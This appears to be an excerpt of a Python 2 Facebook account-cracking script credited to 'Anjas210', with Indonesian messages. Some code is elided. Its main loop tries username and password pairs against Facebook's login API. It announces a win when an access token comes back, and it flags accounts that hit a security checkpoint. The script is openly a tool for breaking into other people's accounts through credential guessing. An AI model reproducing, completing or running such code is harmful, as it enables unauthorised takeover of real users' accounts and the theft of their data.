...
logo = """
* Author  : Anjas210
* github  : https://github.com/Anjas345
* version : v.6"""
...
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mTunguu Ea anjg \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.01)
    ...
    def main(arg):
        ...
        try:
                ...
                if 'access_token' in q:
                    print '\x1b[1;97m\x1b[1;92m[Menang Gan]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m\x1b[1;92m[Menang gan]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + b['name']
                            else:
                                if 'www.facebook.com' in q['error_msg']:
